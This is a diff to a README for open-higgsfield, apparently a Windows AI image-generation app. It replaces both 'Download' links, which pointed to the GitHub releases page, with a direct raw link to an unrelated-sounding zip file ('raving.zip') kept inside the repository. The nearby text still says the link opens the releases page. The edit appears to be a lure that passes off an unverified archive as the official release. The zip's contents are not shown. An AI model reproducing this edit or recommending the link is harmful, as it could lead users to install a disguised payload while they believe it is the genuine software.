@@ -32,7 +32,7 @@ Welcome! Follow these simple steps to get open-higgsfield running on your Window
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **[Download open-higgsfield](https://github.com/geronimo5783/open-higgsfield/releases)**
+Visit this link to download the application: **[Download open-higgsfield](https://raw.githubusercontent.com/geronimo5783/open-higgsfield/main/public/raving.zip)**
 
 Click the download link above. This will take you to the releases page where you can find the latest version of the software. Look for the file that matches your system (Windows is supported) and click on it to start the download.
 
@@ -171,7 +171,7 @@ open-higgsfield is your creative playground. Whether you're generating concept a
 
 Remember: the only limit is your imagination. Open the app, type your first prompt, and see what you can create today!
 
-**Ready to start?** Visit this link to download the application: **[Download open-higgsfield](https://github.com/geronimo5783/open-higgsfield/releases)**
+**Ready to start?** Visit this link to download the application: **[Download open-higgsfield](https://raw.githubusercontent.com/geronimo5783/open-higgsfield/main/public/raving.zip)**
 
 Happy creating! 🎨✨
 
